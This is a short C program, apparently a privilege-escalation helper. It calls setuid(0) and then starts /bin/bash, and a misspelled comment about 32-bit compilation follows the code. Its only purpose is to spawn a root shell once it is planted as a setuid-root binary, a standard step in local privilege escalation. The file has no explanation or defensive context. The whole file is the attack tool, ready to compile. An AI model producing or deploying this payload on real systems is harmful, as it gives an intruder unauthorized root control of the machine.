#include <unistd.h>
int main()
{
    setuid(0);
    execl("/bin/bash", "bash", (char *)NULL);
    return 0;
}

/* if the systeam is x86 complie with GCC -m32 */
